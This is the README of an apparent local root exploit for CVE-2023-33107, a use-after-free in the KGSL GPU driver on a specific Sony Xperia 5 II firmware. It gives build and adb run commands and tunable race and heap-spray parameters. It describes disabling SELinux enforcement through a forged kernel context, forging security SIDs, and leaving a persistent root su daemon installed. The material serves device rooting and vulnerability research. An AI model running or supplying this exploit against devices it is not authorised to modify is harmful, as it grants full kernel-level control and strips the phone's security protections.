# CVE-2023-33107 Xperia root

KGSL UAF temporary-root exploit with a persistent `su` daemon.

| Project | Device | Firmware | Kernel |
| --- | --- | --- | --- |
| `sog02-58.2.C.3.127` | Sony Xperia 5 II (SOG02, KDDI) | `58.2.C.3.127` | `4.19.157-perf+` |

## Build and run

```sh
make PROJECT=sog02-58.2.C.3.127 NDK_ROOT="$NDK"
adb push build/sog02-58.2.C.3.127/kgsl_root_su /data/local/tmp/kgsl_root_su
adb shell 'chmod 755 /data/local/tmp/kgsl_root_su; /data/local/tmp/kgsl_root_su'
adb shell 'getenforce'                    # Permissive
adb shell '/data/local/tmp/su -c id'      # uid=0
```

No environment variables are needed: a plain run drops `selinux_state`
into permissive mode and leaves a persistent root `su` daemon behind (see
[PERMISSIVE.md](PERMISSIVE.md)).  Spray size and KGSL pressure are chosen
from `/proc/meminfo` (8192 children and ~60% of MemAvailable on an 8 GB
device).  The race runs the `kgsl_map_user_mem` thread on a second CPU,
waits for it to enter the driver before the overlap `mmap`, and the memory
scan now batches up to 2048 pages per GPU submission (1 MiB dump buffer,
16 MiB IB).

## Optional settings

| env | default | effect |
| --- | --- | --- |
| `SEC_PERMISSIVE` | `1` | clear `selinux_state.enforcing` through the forged `thread.cpu_context`; `0` skips the hijack and only installs the root `su` daemon |
| `SEC_PERM_TRIGGER` | `1` | `0` performs the dry run: leak KASLR, print the derived addresses, leave the context untouched |
| `SEC_SID=n` | off | forge `task_security_struct` with SID `n` (`1` = `u:r:kernel:s0`); see [SEC_SID.md](SEC_SID.md) |
| `KGSL_CHILDREN` | auto (8192 on >= 7 GB) | spray children (512..16384) |
| `KGSL_PRESSURE_MB` | auto (~60% MemAvailable) | memory pressure to drain the KGSL pool (0..5120) |
| `KGSL_RACERS` | `1` | concurrent `kgsl_map_user_mem` racers (1..4) |
| `KGSL_RACE_CPU` | auto (a second CPU) | CPU for the racer threads; set it to the park CPU to use the old single-CPU race |
| `KGSL_RACE_DELAY_US` | `30` | delay after the racer enters the ioctl before the overlap `mmap` (0..100000) |
| `KGSL_ROUNDS` | `8` | exploit rounds (1..16) |
| `KM_UNLOCK_MODE=read\|write` | off | Keymaster device-state probe through QSEECom |

```sh
# root + permissive (default)
adb shell '/data/local/tmp/kgsl_root_su'

# root only, no kernel write
adb shell 'SEC_PERMISSIVE=0 /data/local/tmp/kgsl_root_su'

# dry run: derive and print, change nothing
adb shell 'SEC_PERM_TRIGGER=0 /data/local/tmp/kgsl_root_su'
```
